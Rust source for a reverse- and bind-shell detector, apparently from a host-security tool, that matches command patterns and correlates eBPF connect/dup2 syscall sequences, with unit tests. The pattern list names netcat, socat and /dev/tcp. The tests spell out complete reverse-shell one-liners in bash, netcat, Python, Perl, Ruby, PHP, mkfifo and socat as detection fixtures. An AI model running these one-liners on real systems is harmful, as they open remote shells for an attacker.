use std::collections::HashMap;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{entities::EntityRef, event::Event, event::Severity, incident::Incident};

/// Detects reverse shell patterns via two methods:
///
/// 1. **Command pattern matching** (existing) — regex-like detection of known
///    reverse shell commands in `shell.command_exec` events.
///
/// 2. **eBPF sequence detection** (new) — correlates `network.outbound_connect` +
///    `process.fd_redirect` (dup2 stdin/stdout to socket) events by PID.
///    Also detects bind shells: `network.bind_listen` + `network.listen` +
///    `process.fd_redirect`.
pub struct ReverseShellDetector {
    host: String,
    cooldown: Duration,
    /// Suppress re-alerts per (command_hash) within cooldown window.
    alerted: HashMap<u64, DateTime<Utc>>,
    /// Track recent network events by PID for sequence detection.
    /// PID → (event_kind, timestamp, dst_ip, dst_port)
    pid_network_events: HashMap<u32, Vec<PidNetworkEvent>>,
}

#[derive(Clone)]
struct PidNetworkEvent {
    kind: String,
    ts: DateTime<Utc>,
    dst_ip: String,
    dst_port: u16,
}

impl ReverseShellDetector {
    pub fn new(host: impl Into<String>, cooldown_seconds: u64) -> Self {
        Self {
            host: host.into(),
            cooldown: Duration::seconds(cooldown_seconds as i64),
            alerted: HashMap::new(),
            pid_network_events: HashMap::new(),
        }
    }

    /// Returns the matched pattern name if the command looks like a reverse shell.
    fn detect_pattern(cmd: &str) -> Option<&'static str> {
        let lower = cmd.to_lowercase();

        // Bash reverse shell: /dev/tcp/ or /dev/udp/
        if lower.contains("/dev/tcp/") || lower.contains("/dev/udp/") {
            return Some("bash_dev_tcp");
        }

        // Netcat variants: nc -e, ncat -e, nc -c, netcat -e
        if (lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat "))
            && (lower.contains(" -e ") || lower.contains(" -c "))
        {
            return Some("netcat_shell");
        }

        // Python reverse shell: python + socket + connect
        if (lower.contains("python") || lower.contains("python3") || lower.contains("python2"))
            && lower.contains("socket")
            && lower.contains("connect")
        {
            return Some("python_reverse_shell");
        }

        // Perl reverse shell: perl + socket + INET
        if lower.contains("perl") && lower.contains("socket") && lower.contains("inet") {
            return Some("perl_reverse_shell");
        }

        // Ruby reverse shell: ruby + TCPSocket
        if lower.contains("ruby") && lower.contains("tcpsocket") {
            return Some("ruby_reverse_shell");
        }

        // PHP reverse shell: php + fsockopen
        if lower.contains("php") && lower.contains("fsockopen") {
            return Some("php_reverse_shell");
        }

        // mkfifo pipe: mkfifo + nc
        if lower.contains("mkfifo") && (lower.contains("nc ") || lower.contains("ncat ")) {
            return Some("mkfifo_pipe");
        }

        // Socat shell: socat + exec + tcp
        if lower.contains("socat") && lower.contains("exec") && lower.contains("tcp") {
            return Some("socat_shell");
        }

        None
    }

    /// Check eBPF event sequences for reverse/bind shell patterns.
    ///
    /// Reverse shell: connect(dst_ip:port) + fd_redirect(stdin/stdout) within 10s
    /// Bind shell: bind_listen + listen + fd_redirect(stdin/stdout) within 10s
    fn check_ebpf_sequence(&mut self, event: &Event) -> Option<Incident> {
        let pid = event.details.get("pid").and_then(|v| v.as_u64())? as u32;
        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");
        let now = event.ts;

        // Record this event for the PID
        let dst_ip = event
            .details
            .get("dst_ip")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let dst_port = event
            .details
            .get("dst_port")
            .or_else(|| event.details.get("port"))
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u16;

        let pid_events = self.pid_network_events.entry(pid).or_default();

        // Expire old events (>30s)
        pid_events.retain(|e| now - e.ts < Duration::seconds(30));

        pid_events.push(PidNetworkEvent {
            kind: event.kind.clone(),
            ts: now,
            dst_ip: dst_ip.clone(),
            dst_port,
        });

        // Only check on fd_redirect — that's the final step
        if event.kind != "process.fd_redirect" {
            return None;
        }

        // Check: is this redirecting stdin (0) or stdout (1)?
        let newfd = event
            .details
            .get("newfd")
            .and_then(|v| v.as_u64())
            .unwrap_or(99);
        if newfd > 2 {
            return None; // Not redirecting stdio
        }

        // Check for reverse shell: connect + fd_redirect
        let has_connect = pid_events
            .iter()
            .any(|e| e.kind == "network.outbound_connect");

        // Check for bind shell: bind_listen + listen + fd_redirect
        let has_bind = pid_events.iter().any(|e| e.kind == "network.bind_listen");
        let has_listen = pid_events.iter().any(|e| e.kind == "network.listen");

        let (pattern, target_ip, target_port) = if has_connect {
            // Reverse shell detected
            let conn = pid_events
                .iter()
                .find(|e| e.kind == "network.outbound_connect")?;
            ("ebpf_reverse_shell", conn.dst_ip.clone(), conn.dst_port)
        } else if has_bind && has_listen {
            // Bind shell detected
            let bind = pid_events
                .iter()
                .find(|e| e.kind == "network.bind_listen")?;
            ("ebpf_bind_shell", bind.dst_ip.clone(), bind.dst_port)
        } else {
            return None;
        };

        // Cooldown check
        let key = Self::hash_command(&format!("{pattern}:{pid}"));
        if let Some(&last) = self.alerted.get(&key) {
            if now - last < self.cooldown {
                return None;
            }
        }
        self.alerted.insert(key, now);

        // Clear tracked events for this PID
        self.pid_network_events.remove(&pid);

        // Prune stale PID entries
        if self.pid_network_events.len() > 5000 {
            let cutoff = now - Duration::seconds(30);
            self.pid_network_events.retain(|_, events| {
                events.retain(|e| e.ts > cutoff);
                !events.is_empty()
            });
        }

        let severity = Severity::Critical;
        let target_display = if target_ip.is_empty() {
            format!("port {target_port}")
        } else {
            format!("{target_ip}:{target_port}")
        };

        let mut entities = vec![];
        if !target_ip.is_empty() {
            entities.push(EntityRef::ip(&target_ip));
        }

        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!(
                "reverse_shell:{pattern}:{pid}:{}",
                now.format("%Y-%m-%dT%H:%MZ")
            ),
            severity,
            title: format!(
                "Reverse shell detected via eBPF ({pattern}): {comm} → {target_display}"
            ),
            summary: format!(
                "eBPF syscall sequence detected {pattern}: process {comm} (pid={pid}) \
                 established connection to {target_display} then redirected fd {newfd} to socket. \
                 This is a definitive reverse/bind shell — detected at kernel level."
            ),
            evidence: serde_json::json!([{
                "kind": "reverse_shell",
                "pattern": pattern,
                "detection": "ebpf_sequence",
                "comm": comm,
                "pid": pid,
                "target_ip": target_ip,
                "target_port": target_port,
                "redirected_fd": newfd,
            }]),
            recommended_checks: vec![
                format!("Kill process immediately: kill -9 {pid}"),
                format!("Block attacker IP: {target_display}"),
                "Check for lateral movement from this host".to_string(),
                "Review process tree: who spawned this shell?".to_string(),
            ],
            tags: vec![
                "reverse_shell".to_string(),
                "ebpf".to_string(),
                "post_exploitation".to_string(),
            ],
            entities,
        })
    }

    /// Simple hash for cooldown keying - avoids storing full command strings.
    fn hash_command(cmd: &str) -> u64 {
        use std::hash::{Hash, Hasher};
        let mut hasher = std::collections::hash_map::DefaultHasher::new();
        cmd.hash(&mut hasher);
        hasher.finish()
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        // ── eBPF sequence detection ────────────────────────────────────
        // Track connect/bind/listen/fd_redirect events by PID to detect
        // reverse shells and bind shells at the syscall level.
        if event.kind == "network.outbound_connect"
            || event.kind == "network.bind_listen"
            || event.kind == "network.listen"
            || event.kind == "process.fd_redirect"
        {
            if let Some(incident) = self.check_ebpf_sequence(event) {
                return Some(incident);
            }
            return None;
        }

        if event.kind != "shell.command_exec" && event.kind != "process.exec" {
            return None;
        }

        let command = event.details.get("command").and_then(|v| v.as_str());
        let args = event.details.get("args").and_then(|v| v.as_str());

        // Check both command and args fields; combine for pattern matching
        let text = match (command, args) {
            (Some(c), Some(a)) => format!("{c} {a}"),
            (Some(c), None) => c.to_string(),
            (None, Some(a)) => a.to_string(),
            (None, None) => return None,
        };

        if text.is_empty() {
            return None;
        }

        let pattern = Self::detect_pattern(&text)?;

        let now = event.ts;
        let key = Self::hash_command(&text);

        // Cooldown check
        if let Some(&last) = self.alerted.get(&key) {
            if now - last < self.cooldown {
                return None;
            }
        }
        self.alerted.insert(key, now);

        let pid = event
            .details
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        // Truncate command for display
        let display_cmd = if text.len() > 200 {
            format!("{}...", &text[..200])
        } else {
            text.clone()
        };

        // Prune stale entries
        if self.alerted.len() > 1000 {
            let cutoff = now - self.cooldown;
            self.alerted.retain(|_, ts| *ts > cutoff);
        }

        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!(
                "reverse_shell:{pattern}:{pid}:{}",
                now.format("%Y-%m-%dT%H:%MZ")
            ),
            severity: Severity::Critical,
            title: format!("Reverse shell detected ({pattern}): {display_cmd}"),
            summary: format!(
                "Reverse shell pattern '{pattern}' detected in process {comm} \
                 (pid={pid}, uid={uid}): {display_cmd}"
            ),
            evidence: serde_json::json!([{
                "kind": "reverse_shell",
                "pattern": pattern,
                "comm": comm,
                "pid": pid,
                "uid": uid,
                "command": text,
            }]),
            recommended_checks: vec![
                format!("Kill process immediately: kill -9 {pid}"),
                format!("Investigate parent process: ps -o ppid= -p {pid}"),
                "Check for network connections: ss -tunp".to_string(),
                "Review user account for compromise".to_string(),
                "Check for persistence mechanisms: crontab -l, ~/.bashrc, /etc/cron.d/".to_string(),
            ],
            tags: vec!["reverse_shell".to_string(), "post_exploitation".to_string()],
            entities: vec![],
        })
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn exec_event(command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "shell.command_exec".to_string(),
            severity: Severity::Info,
            summary: format!("Shell command: {command}"),
            details: serde_json::json!({
                "pid": 1234,
                "uid": 1000,
                "ppid": 1,
                "comm": "bash",
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn process_exec_event(command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "process.exec".to_string(),
            severity: Severity::Info,
            summary: format!("Process exec: {command}"),
            details: serde_json::json!({
                "pid": 5678,
                "uid": 0,
                "ppid": 1,
                "comm": "sh",
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    #[test]
    fn detects_bash_dev_tcp() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("bash_dev_tcp"));
    }

    #[test]
    fn detects_bash_dev_udp() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("bash -i >& /dev/udp/10.0.0.1/53 0>&1", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("bash_dev_tcp"));
    }

    #[test]
    fn detects_netcat_e() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("nc -e /bin/sh 10.0.0.1 4444", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("netcat_shell"));
    }

    #[test]
    fn detects_ncat_e() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det.process(&exec_event("ncat -e /bin/bash 10.0.0.1 4444", now));
        assert!(inc.is_some());
    }

    #[test]
    fn detects_nc_c() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("nc -c /bin/sh 10.0.0.1 4444", now))
            .unwrap();
        assert!(inc.title.contains("netcat_shell"));
    }

    #[test]
    fn detects_python_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("python_reverse_shell"));
    }

    #[test]
    fn detects_perl_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("perl_reverse_shell"));
    }

    #[test]
    fn detects_ruby_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("ruby_reverse_shell"));
    }

    #[test]
    fn detects_php_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("php_reverse_shell"));
    }

    #[test]
    fn detects_mkfifo_pipe() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("mkfifo_pipe"));
    }

    #[test]
    fn detects_socat_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("socat_shell"));
    }

    #[test]
    fn cooldown_suppresses_duplicate() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        assert!(det.process(&exec_event(cmd, now)).is_some());
        assert!(det
            .process(&exec_event(cmd, now + Duration::seconds(10)))
            .is_none());
    }

    #[test]
    fn fires_again_after_cooldown() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        assert!(det.process(&exec_event(cmd, now)).is_some());
        assert!(det
            .process(&exec_event(cmd, now + Duration::seconds(301)))
            .is_some());
    }

    #[test]
    fn ignores_normal_commands() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det.process(&exec_event("ls -la /tmp", now)).is_none());
        assert!(det
            .process(&exec_event("curl https://example.com", now))
            .is_none());
        assert!(det
            .process(&exec_event("python3 -m http.server", now))
            .is_none());
        assert!(det.process(&exec_event("nc -l -p 8080", now)).is_none());
    }

    #[test]
    fn ignores_irrelevant_event_kinds() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let event = Event {
            ts: now,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "file.write_access".to_string(),
            severity: Severity::Info,
            summary: "file write".to_string(),
            details: serde_json::json!({
                "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            }),
            tags: vec![],
            entities: vec![],
        };
        assert!(det.process(&event).is_none());
    }

    // ── eBPF sequence detection tests ──

    fn connect_event(pid: u32, dst_ip: &str, dst_port: u16, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.outbound_connect".to_string(),
            severity: Severity::Info,
            summary: format!("connect to {dst_ip}:{dst_port}"),
            details: serde_json::json!({
                "pid": pid, "uid": 0, "comm": "bash",
                "dst_ip": dst_ip, "dst_port": dst_port,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn fd_redirect_event(pid: u32, oldfd: u32, newfd: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "process.fd_redirect".to_string(),
            severity: Severity::High,
            summary: format!("fd {oldfd} → {newfd}"),
            details: serde_json::json!({
                "pid": pid, "uid": 0, "comm": "bash",
                "oldfd": oldfd, "newfd": newfd,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn bind_event(pid: u32, port: u16, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.bind_listen".to_string(),
            severity: Severity::High,
            summary: format!("bind to 0.0.0.0:{port}"),
            details: serde_json::json!({
                "pid": pid, "uid": 0, "comm": "nc",
                "dst_ip": "0.0.0.0", "port": port,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn listen_event(pid: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.listen".to_string(),
            severity: Severity::High,
            summary: "listen".to_string(),
            details: serde_json::json!({
                "pid": pid, "uid": 0, "comm": "nc",
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    #[test]
    fn detects_ebpf_reverse_shell_sequence() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        // Step 1: connect to attacker
        assert!(det
            .process(&connect_event(1234, "10.0.0.1", 4444, now))
            .is_none());

        // Step 2: redirect stdin to socket → reverse shell!
        let inc = det
            .process(&fd_redirect_event(1234, 5, 0, now + Duration::seconds(1)))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("ebpf_reverse_shell"));
        assert!(inc.summary.contains("kernel level"));
    }

    #[test]
    fn detects_ebpf_bind_shell_sequence() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        // Step 1: bind to port
        assert!(det.process(&bind_event(5678, 4444, now)).is_none());

        // Step 2: listen
        assert!(det
            .process(&listen_event(5678, now + Duration::seconds(1)))
            .is_none());

        // Step 3: redirect stdout to socket → bind shell!
        let inc = det
            .process(&fd_redirect_event(5678, 5, 1, now + Duration::seconds(2)))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("ebpf_bind_shell"));
    }

    #[test]
    fn ebpf_sequence_needs_matching_pid() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        // Connect from PID 1234
        det.process(&connect_event(1234, "10.0.0.1", 4444, now));

        // fd_redirect from different PID 5678 → should NOT trigger
        let inc = det.process(&fd_redirect_event(5678, 5, 0, now + Duration::seconds(1)));
        assert!(inc.is_none());
    }

    #[test]
    fn ebpf_sequence_ignores_non_stdio_redirect() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        det.process(&connect_event(1234, "10.0.0.1", 4444, now));

        // fd_redirect to fd 5 (not stdin/stdout/stderr) → should NOT trigger
        let inc = det.process(&fd_redirect_event(1234, 3, 5, now + Duration::seconds(1)));
        assert!(inc.is_none());
    }

    #[test]
    fn ebpf_sequence_expires_after_30s() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();

        det.process(&connect_event(1234, "10.0.0.1", 4444, now));

        // fd_redirect 31 seconds later → too late, sequence expired
        let inc = det.process(&fd_redirect_event(1234, 5, 0, now + Duration::seconds(31)));
        assert!(inc.is_none());
    }

    #[test]
    fn works_with_process_exec_kind() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&process_exec_event(
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                now,
            ))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
    }
}
